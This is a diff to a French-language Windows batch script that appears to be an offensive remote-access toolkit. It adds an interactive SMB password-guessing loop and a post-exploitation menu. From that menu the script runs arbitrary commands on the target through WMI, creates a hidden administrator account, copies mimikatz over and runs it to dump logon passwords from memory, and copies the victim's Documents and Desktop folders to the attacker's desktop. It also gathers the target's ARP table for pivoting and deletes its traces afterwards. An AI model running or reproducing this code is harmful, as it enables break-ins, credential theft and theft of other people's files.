@@ -2714,6 +2714,7 @@ goto wan_dispatch
 set "fwd_opts=Retour"
 set "fwd_actions=retour"
 if not "!fp:,445,=!"=="!fp!" set "fwd_opts=[BRUTE] Tester credentials communs~Teste admin/guest avec mots de passe courants (SMB);!fwd_opts!" & set "fwd_actions=smb_brute,!fwd_actions!"
+if not "!fp:,445,=!"=="!fp!" set "fwd_opts=[MANUEL] Saisir un mot de passe~Tester manuellement vos propres mots de passe;!fwd_opts!" & set "fwd_actions=manual_pass,!fwd_actions!"
 if not "!fp:,445,=!"=="!fp!" set "fwd_opts=Explorer partages SMB~Parcourir C$, Admin$ et partages;!fwd_opts!" & set "fwd_actions=smb,!fwd_actions!"
 if not "!fp:,445,=!"=="!fp!" set "fwd_opts=[SMB] Test session anonyme~Connexion IPC$ sans identifiants;!fwd_opts!" & set "fwd_actions=smb_null,!fwd_actions!"
 if not "!fp:,21,=!"=="!fp!" set "fwd_opts=[FTP] Login anonyme~Test acces FTP sans compte;!fwd_opts!" & set "fwd_actions=ftp_anon,!fwd_actions!"
@@ -2760,6 +2761,7 @@ if "!sel_action!"=="smb_creds" goto action_smb_creds
 if "!sel_action!"=="rpc_enum" goto action_rpc_enum
 if "!sel_action!"=="ftp_anon" goto action_ftp_anon
 if "!sel_action!"=="smb_brute" goto action_smb_brute
+if "!sel_action!"=="manual_pass" goto action_manual_pass
 goto wan_post_scan
 
 :action_smb_creds
@@ -2785,15 +2787,11 @@ if errorlevel 1 (
     goto smb_creds_loop
 )
 echo.
-echo  [+] ACCES C$ OK ^! Ouverture explorateur...
-start explorer \\!smb_host!\C$
-echo.
-echo  [i] Partage connecte. Pour deconnecter : net use \\!smb_host!\C$ /delete
+echo  [+] ACCES C$ OK ^! Credentials confirmes.
+set "cred_u=!smb_user!"
+set "cred_p=!smb_pass!"
 set "smb_pass="
-echo.
-pause
-net use \\!smb_host!\C$ /delete >nul 2>&1
-goto wan_post_scan
+goto wan_post_creds
 
 :action_smb_null
 cls
@@ -2942,6 +2940,54 @@ echo.
 pause
 goto wan_post_scan
 
+:action_manual_pass
+cls
+echo.
+echo %B%  [MANUEL] TEST MOT DE PASSE - SMB%N%
+echo  Cible : !remote_ip!
+if defined remote_user echo  User  : !remote_user! %Y%[compte capture]%N%
+echo.
+set "smb_host=!remote_ip!"
+set "tmp_v6=!remote_ip::=!"
+if not "!tmp_v6!"=="!remote_ip!" set "smb_host=!remote_ip::=-!.ipv6-literal.net"
+set "man_user=!remote_user!"
+if not defined man_user (
+    call :InputWithEsc "  Nom d'utilisateur : " man_user
+    if errorlevel 1 goto wan_menu_nocreds
+    if not defined man_user goto wan_menu_nocreds
+) else (
+    echo  [i] Utilisateur : %Y%!man_user!%N% ^(capture^)
+    echo  [i] Entree vide = changer d'utilisateur
+    echo.
+)
+echo  [i] ECHAP ou mot de passe vide = retour au menu
+echo  ================================================
+:manual_pass_loop
+net use "\\!smb_host!" /delete /y >nul 2>&1
+set "man_pass="
+call :InputWithEsc "  Mot de passe : " man_pass
+if errorlevel 1 goto wan_menu_nocreds
+if not defined man_pass (
+    set "man_user="
+    goto action_manual_pass
+)
+net use "\\!smb_host!\IPC$" "!man_pass!" /user:"!man_user!" >nul 2>&1
+if errorlevel 1 (
+    echo  %R%[-] Echec%N%
+    goto manual_pass_loop
+)
+net use "\\!smb_host!\IPC$" /delete /y >nul 2>&1
+echo.
+echo  %G%[+] MOT DE PASSE CORRECT : !man_user! / !man_pass!%N%
+echo.
+set "cred_u=!man_user!"
+set "cred_p=!man_pass!"
+set "man_user="
+set "man_pass="
+echo  [i] Appuyez sur une touche pour acceder au menu post-exploitation...
+pause >nul
+goto wan_post_creds
+
 :action_smb_brute
 cls
 echo.
@@ -3053,16 +3099,12 @@ if errorlevel 1 (
     pause
     goto wan_menu_nocreds
 )
-echo  [+] ACCES C$ OK ^! Ouverture explorateur...
-start explorer "\\!smb_host!\C$"
-echo.
-echo  [i] Partage connecte. Pour deconnecter : net use \\!smb_host!\C$ /delete
-echo.
+echo  [+] ACCES C$ OK ^! Credentials confirmes.
+set "cred_u=!b_u!"
+set "cred_p=!b_p!"
 set "b_u="
 set "b_p="
-pause
-net use "\\!smb_host!\C$" /delete >nul 2>&1
-goto wan_post_scan
+goto wan_post_creds
 
 :brute_try
 net use "\\!smb_host!" /delete /y >nul 2>&1
@@ -3099,6 +3141,282 @@ nmap -p 445 --script smb-brute !remote_ip!
 echo.
 echo  [i] Si credential trouve : utilisez ^"J'ai le mot de passe^" pour l'exploiter.
 goto :eof
+
+REM ==========================================================
+REM  POST-EXPLOITATION
+REM ==========================================================
+:wan_post_creds
+set "PEX_USER=!cred_u!"
+set "PEX_PASS=!cred_p!"
+set "PEX_IP=!remote_ip!"
+set "PEX_HOST=!smb_host!"
+cls
+echo.
+echo  ====================================================
+echo   POST-EXPLOITATION
+echo  ====================================================
+echo   IP   : !remote_ip!
+echo   User : !cred_u!
+echo  ====================================================
+echo.
+call :DynamicMenu "CONTROLE DE LA MACHINE" "Ouvrir C$ dans l'explorateur~Navigation complete du disque distant;Executer une commande~cmd.exe distant via WMI + lecture sortie;Voir les processus~Top 25 processus par RAM (WMI);Gestion des comptes~Lister, creer admin cache, supprimer;Extraire MDP memoire~Mimikatz sekurlsa si disponible;Exfiltrer des fichiers~Copier Documents/Bureau vers local;Pivoter - scanner reseau interne~ARP + scan depuis la machine cible;Retour" "NONUMS NOCLS"
+set "pex_ch=%errorlevel%"
+if "%pex_ch%"=="0" goto wan_post_scan
+set "pex_sel="
+set "idx=0"
+for %%A in (open_c,cmd,procs,accounts,mimi,exfil,pivot,retour) do (
+    set /a idx+=1
+    if "!idx!"=="!pex_ch!" set "pex_sel=%%A"
+)
+if "!pex_sel!"=="open_c"   goto pex_open_c
+if "!pex_sel!"=="cmd"      goto pex_cmd
+if "!pex_sel!"=="procs"    goto pex_procs
+if "!pex_sel!"=="accounts" goto pex_accounts
+if "!pex_sel!"=="mimi"     goto pex_mimi
+if "!pex_sel!"=="exfil"    goto pex_exfil
+if "!pex_sel!"=="pivot"    goto pex_pivot
+if "!pex_sel!"=="retour"   goto wan_post_scan
+goto wan_post_creds
+
+REM --- Ouvrir C$ ---
+:pex_open_c
+net use "\\!smb_host!\C$" "!cred_p!" /user:"!cred_u!" >nul 2>&1
+start explorer "\\!smb_host!\C$"
+echo.
+echo  [+] C$ ouvert dans l'explorateur.
+echo  [i] Pour deconnecter : net use \\!smb_host!\C$ /delete
+echo.
+pause
+net use "\\!smb_host!\C$" /delete >nul 2>&1
+goto wan_post_creds
+
+REM --- Executer une commande ---
+:pex_cmd
+cls
+echo.
+echo  [CMD] EXECUTION DISTANTE - !remote_ip!
+echo  [i] WMI - necessite port 135
+echo.
+set "pex_command="
+call :InputWithEsc "  Commande : " pex_command
+if errorlevel 1 goto wan_post_creds
+if not defined pex_command goto wan_post_creds
+set "PEX_CMD=!pex_command!"
+echo.
+echo  [*] Execution via WMI...
+set "PEX_PS=%TEMP%\pex_cmd_%RANDOM%.ps1"
+>> "%PEX_PS%" echo $u=$env:PEX_USER;$p=$env:PEX_PASS;$ip=$env:PEX_IP;$h=$env:PEX_HOST;$cmd=$env:PEX_CMD
+>> "%PEX_PS%" echo $ss=ConvertTo-SecureString $p -AsPlainText -Force
+>> "%PEX_PS%" echo $cr=New-Object PSCredential($u,$ss)
+>> "%PEX_PS%" echo $tmp="pex_$(Get-Random).txt"
+>> "%PEX_PS%" echo try {
+>> "%PEX_PS%" echo   $null=Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c $cmd > C:\Windows\Temp\$tmp 2>&1" -ComputerName $ip -Credential $cr -EA Stop
+>> "%PEX_PS%" echo   Start-Sleep 3
+>> "%PEX_PS%" echo   net use "\\$h\C$" $p /user:$u ^>$null 2^>$null
+>> "%PEX_PS%" echo   $out=Get-Content "\\$h\C$\Windows\Temp\$tmp" -EA SilentlyContinue
+>> "%PEX_PS%" echo   if ($out) { $out ^| ForEach-Object { Write-Host "  $_" } } else { Write-Host "  [i] Aucune sortie" -f Yellow }
+>> "%PEX_PS%" echo   $null=Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c del /f /q C:\Windows\Temp\$tmp" -ComputerName $ip -Credential $cr
+>> "%PEX_PS%" echo   net use "\\$h\C$" /delete ^>$null 2^>$null
+>> "%PEX_PS%" echo } catch { Write-Host "  [ERR] $($_.Exception.Message)" -f Red; Write-Host "  [i] Port 135 requis pour WMI" -f Yellow }
+powershell -NoProfile -ExecutionPolicy Bypass -File "%PEX_PS%"
+if exist "%PEX_PS%" del /f /q "%PEX_PS%"
+echo.
+pause
+goto pex_cmd
+
+REM --- Processus ---
+:pex_procs
+cls
+echo.
+echo  [PROCS] PROCESSUS EN COURS - !remote_ip!
+echo.
+set "PEX_PS=%TEMP%\pex_procs_%RANDOM%.ps1"
+>> "%PEX_PS%" echo $u=$env:PEX_USER;$p=$env:PEX_PASS;$ip=$env:PEX_IP
+>> "%PEX_PS%" echo $ss=ConvertTo-SecureString $p -AsPlainText -Force
+>> "%PEX_PS%" echo $cr=New-Object PSCredential($u,$ss)
+>> "%PEX_PS%" echo try {
+>> "%PEX_PS%" echo   $list=Get-WmiObject Win32_Process -ComputerName $ip -Credential $cr -EA Stop ^| Sort-Object WorkingSetSize -Desc ^| Select-Object -First 25
+>> "%PEX_PS%" echo   Write-Host ("  "+("Processus".PadRight(32))+("PID".PadRight(8))+"RAM MB") -f Yellow
+>> "%PEX_PS%" echo   Write-Host ("  "+"-"*52) -f DarkGray
+>> "%PEX_PS%" echo   foreach ($proc in $list) { Write-Host ("  "+$proc.Name.PadRight(32)+([string]$proc.ProcessId).PadRight(8)+[math]::Round($proc.WorkingSetSize/1MB,1)) }
+>> "%PEX_PS%" echo } catch { Write-Host "  [ERR] $($_.Exception.Message)" -f Red }
+powershell -NoProfile -ExecutionPolicy Bypass -File "%PEX_PS%"
+if exist "%PEX_PS%" del /f /q "%PEX_PS%"
+echo.
+pause
+goto wan_post_creds
+
+REM --- Gestion comptes ---
+:pex_accounts
+cls
+echo.
+echo  [COMPTES] GESTION - !remote_ip!
+echo.
+call :DynamicMenu "COMPTES" "Lister les comptes~net user distant;Creer un admin cache~Nouveau compte + groupe Administrators;Supprimer un compte~net user /delete;Retour" "NONUMS NOCLS"
+set "acc_ch=%errorlevel%"
+if "%acc_ch%"=="0" goto wan_post_creds
+if "%acc_ch%"=="1" ( set "PEX_CMD=net user" & goto pex_run_wmi )
+if "%acc_ch%"=="2" goto pex_create_admin
+if "%acc_ch%"=="3" goto pex_del_account
+goto wan_post_creds
+
+:pex_create_admin
+set "new_acc="
+set "new_pwd="
+call :InputWithEsc "  Nom du compte  : " new_acc
+if errorlevel 1 goto pex_accounts
+if not defined new_acc goto pex_accounts
+call :InputWithEsc "  Mot de passe   : " new_pwd
+if errorlevel 1 goto pex_accounts
+if not defined new_pwd goto pex_accounts
+set "PEX_CMD=net user !new_acc! !new_pwd! /add /Y ^& net localgroup Administrators !new_acc! /add /Y"
+set "new_acc="
+set "new_pwd="
+goto pex_run_wmi
+
+:pex_del_account
+set "del_acc="
+call :InputWithEsc "  Compte a supprimer : " del_acc
+if errorlevel 1 goto pex_accounts
+if not defined del_acc goto pex_accounts
+set "PEX_CMD=net user !del_acc! /delete"
+set "del_acc="
+goto pex_run_wmi
+
+:pex_run_wmi
+cls
+echo.
+echo  [*] Execution : !PEX_CMD!
+echo.
+set "PEX_PS=%TEMP%\pex_wmi_%RANDOM%.ps1"
+>> "%PEX_PS%" echo $u=$env:PEX_USER;$p=$env:PEX_PASS;$ip=$env:PEX_IP;$h=$env:PEX_HOST;$cmd=$env:PEX_CMD
+>> "%PEX_PS%" echo $ss=ConvertTo-SecureString $p -AsPlainText -Force
+>> "%PEX_PS%" echo $cr=New-Object PSCredential($u,$ss)
+>> "%PEX_PS%" echo $tmp="pex_$(Get-Random).txt"
+>> "%PEX_PS%" echo try {
+>> "%PEX_PS%" echo   $null=Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c $cmd > C:\Windows\Temp\$tmp 2>&1" -ComputerName $ip -Credential $cr -EA Stop
+>> "%PEX_PS%" echo   Start-Sleep 2
+>> "%PEX_PS%" echo   net use "\\$h\C$" $p /user:$u ^>$null 2^>$null
+>> "%PEX_PS%" echo   Get-Content "\\$h\C$\Windows\Temp\$tmp" -EA SilentlyContinue ^| ForEach-Object { Write-Host "  $_" }
+>> "%PEX_PS%" echo   $null=Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c del /f /q C:\Windows\Temp\$tmp" -ComputerName $ip -Credential $cr
+>> "%PEX_PS%" echo   net use "\\$h\C$" /delete ^>$null 2^>$null
+>> "%PEX_PS%" echo } catch { Write-Host "  [ERR] $($_.Exception.Message)" -f Red }
+powershell -NoProfile -ExecutionPolicy Bypass -File "%PEX_PS%"
+if exist "%PEX_PS%" del /f /q "%PEX_PS%"
+echo.
+pause
+goto pex_accounts
+
+REM --- Mimikatz ---
+:pex_mimi
+cls
+echo.
+echo  [MIMI] EXTRACTION MDP MEMOIRE - !remote_ip!
+echo.
+set "mimi_path="
+where mimikatz.exe >nul 2>&1 && set "mimi_path=mimikatz.exe"
+if not defined mimi_path if exist "%~dp0mimikatz.exe" set "mimi_path=%~dp0mimikatz.exe"
+if not defined mimi_path if exist "C:\Tools\mimikatz.exe" set "mimi_path=C:\Tools\mimikatz.exe"
+if not defined mimi_path (
+    echo  [-] mimikatz.exe introuvable sur ce PC.
+    echo  [i] Placez mimikatz.exe dans : %~dp0
+    echo  [i] Ou dans C:\Tools\
+    echo.
+    pause
+    goto wan_post_creds
+)
+echo  [+] Detecte : !mimi_path!
+echo  [*] Copie via C$ + execution WMI...
+set "PEX_MIMI=!mimi_path!"
+set "PEX_PS=%TEMP%\pex_mimi_%RANDOM%.ps1"
+>> "%PEX_PS%" echo $u=$env:PEX_USER;$p=$env:PEX_PASS;$ip=$env:PEX_IP;$h=$env:PEX_HOST;$mimi=$env:PEX_MIMI
+>> "%PEX_PS%" echo $ss=ConvertTo-SecureString $p -AsPlainText -Force
+>> "%PEX_PS%" echo $cr=New-Object PSCredential($u,$ss)
+>> "%PEX_PS%" echo $tmp="mimi_$(Get-Random)"
+>> "%PEX_PS%" echo try {
+>> "%PEX_PS%" echo   net use "\\$h\C$" $p /user:$u ^>$null 2^>$null
+>> "%PEX_PS%" echo   Copy-Item $mimi "\\$h\C$\Windows\Temp\$tmp.exe" -Force
+>> "%PEX_PS%" echo   $null=Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c C:\Windows\Temp\$tmp.exe ""privilege::debug sekurlsa::logonpasswords exit"" > C:\Windows\Temp\$tmp.txt 2>&1" -ComputerName $ip -Credential $cr -EA Stop
+>> "%PEX_PS%" echo   Start-Sleep 5
+>> "%PEX_PS%" echo   Get-Content "\\$h\C$\Windows\Temp\$tmp.txt" -EA SilentlyContinue ^| ForEach-Object { Write-Host "  $_" }
+>> "%PEX_PS%" echo   $null=Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c del /f /q C:\Windows\Temp\$tmp.exe C:\Windows\Temp\$tmp.txt" -ComputerName $ip -Credential $cr
+>> "%PEX_PS%" echo   net use "\\$h\C$" /delete ^>$null 2^>$null
+>> "%PEX_PS%" echo } catch { Write-Host "  [ERR] $($_.Exception.Message)" -f Red }
+powershell -NoProfile -ExecutionPolicy Bypass -File "%PEX_PS%"
+if exist "%PEX_PS%" del /f /q "%PEX_PS%"
+echo.
+pause
+goto wan_post_creds
+
+REM --- Exfiltration ---
+:pex_exfil
+cls
+echo.
+echo  [EXFIL] EXFILTRATION - !remote_ip!
+echo.
+call :DynamicMenu "EXFILTRER" "Documents~C:\Users\[user]\Documents;Bureau~C:\Users\[user]\Desktop;Chemin personnalise~Entrer un chemin distant;Retour" "NONUMS NOCLS"
+set "exfil_ch=%errorlevel%"
+if "%exfil_ch%"=="0" goto wan_post_creds
+set "exfil_src="
+if "%exfil_ch%"=="1" set "exfil_src=C:\Users\!cred_u!\Documents"
+if "%exfil_ch%"=="2" set "exfil_src=C:\Users\!cred_u!\Desktop"
+if "%exfil_ch%"=="3" (
+    call :InputWithEsc "  Chemin distant (ex: C:\Users\Alex\AppData) : " exfil_src
+    if errorlevel 1 goto pex_exfil
+    if not defined exfil_src goto pex_exfil
+)
+if "%exfil_ch%"=="4" goto wan_post_creds
+set "exfil_dst=%USERPROFILE%\Desktop\Exfil_!remote_pc!"
+if not defined remote_pc set "exfil_dst=%USERPROFILE%\Desktop\Exfil_%RANDOM%"
+echo  [*] Copie de : !exfil_src!
+echo  [*] Vers     : !exfil_dst!
+echo.
+set "PEX_SRC=!exfil_src!"
+set "PEX_DST=!exfil_dst!"
+set "PEX_PS=%TEMP%\pex_exfil_%RANDOM%.ps1"
+>> "%PEX_PS%" echo $u=$env:PEX_USER;$p=$env:PEX_PASS;$h=$env:PEX_HOST;$src=$env:PEX_SRC;$dst=$env:PEX_DST
+>> "%PEX_PS%" echo try {
+>> "%PEX_PS%" echo   net use "\\$h\C$" $p /user:$u ^>$null 2^>$null
+>> "%PEX_PS%" echo   $smb_src = "\\$h\C$\" + ($src -replace '^[A-Za-z]:\\','')
+>> "%PEX_PS%" echo   Write-Host "  [*] Source SMB : $smb_src" -f DarkGray
+>> "%PEX_PS%" echo   if (-not (Test-Path $dst)) { $null=New-Item $dst -ItemType Directory -Force }
+>> "%PEX_PS%" echo   Copy-Item $smb_src $dst -Recurse -Force -EA Stop
+>> "%PEX_PS%" echo   Write-Host "  [+] Copie terminee : $dst" -f Green
+>> "%PEX_PS%" echo   net use "\\$h\C$" /delete ^>$null 2^>$null
+>> "%PEX_PS%" echo } catch { Write-Host "  [ERR] $($_.Exception.Message)" -f Red; net use "\\$h\C$" /delete ^>$null 2^>$null }
+powershell -NoProfile -ExecutionPolicy Bypass -File "%PEX_PS%"
+if exist "%PEX_PS%" del /f /q "%PEX_PS%"
+echo.
+pause
+goto pex_exfil
+
+REM --- Pivot ---
+:pex_pivot
+cls
+echo.
+echo  [PIVOT] RESEAU INTERNE - !remote_ip!
+echo  [i] Execute arp + scan ping depuis la cible via WMI
+echo.
+set "PEX_PS=%TEMP%\pex_pivot_%RANDOM%.ps1"
+set "PEX_CMD=arp -a"
+>> "%PEX_PS%" echo $u=$env:PEX_USER;$p=$env:PEX_PASS;$ip=$env:PEX_IP;$h=$env:PEX_HOST
+>> "%PEX_PS%" echo $ss=ConvertTo-SecureString $p -AsPlainText -Force
+>> "%PEX_PS%" echo $cr=New-Object PSCredential($u,$ss)
+>> "%PEX_PS%" echo $tmp="pex_$(Get-Random).txt"
+>> "%PEX_PS%" echo try {
+>> "%PEX_PS%" echo   $null=Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c arp -a > C:\Windows\Temp\$tmp 2>&1" -ComputerName $ip -Credential $cr -EA Stop
+>> "%PEX_PS%" echo   Start-Sleep 2
+>> "%PEX_PS%" echo   net use "\\$h\C$" $p /user:$u ^>$null 2^>$null
+>> "%PEX_PS%" echo   Write-Host "  [ARP] Table de la cible :" -f Yellow
+>> "%PEX_PS%" echo   Get-Content "\\$h\C$\Windows\Temp\$tmp" -EA SilentlyContinue ^| ForEach-Object { Write-Host "  $_" }
+>> "%PEX_PS%" echo   $null=Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c del /f /q C:\Windows\Temp\$tmp" -ComputerName $ip -Credential $cr
+>> "%PEX_PS%" echo   net use "\\$h\C$" /delete ^>$null 2^>$null
+>> "%PEX_PS%" echo } catch { Write-Host "  [ERR] $($_.Exception.Message)" -f Red }
+powershell -NoProfile -ExecutionPolicy Bypass -File "%PEX_PS%"
+if exist "%PEX_PS%" del /f /q "%PEX_PS%"
+echo.
+pause
+goto wan_post_creds
 
 :start_lan_scan
 echo.
